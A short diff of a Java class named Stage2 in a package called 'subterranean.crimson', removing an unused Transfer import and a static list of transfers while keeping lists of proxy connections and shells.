@@ -16,7 +16,6 @@ import subterranean.crimson.universal.NativeUtilities;
 import subterranean.crimson.universal.Platform;
 import subterranean.crimson.universal.containers.SystemMessage;
 import subterranean.crimson.universal.database.Database;
-import subterranean.crimson.universal.transfer.Transfer;
 
 public class Stage2 {
 
@@ -27,7 +26,6 @@ public class Stage2 {
 
 	public static ArrayList<ProxyConnection> pConnections = new ArrayList<ProxyConnection>();
 	public static ArrayList<Shell> shells = new ArrayList<Shell>();
-	public static ArrayList<Transfer> transfers = new ArrayList<Transfer>();
 
 	public static void run(String[] arguments) {
 		// Establish an UncaughtExceptionHandler
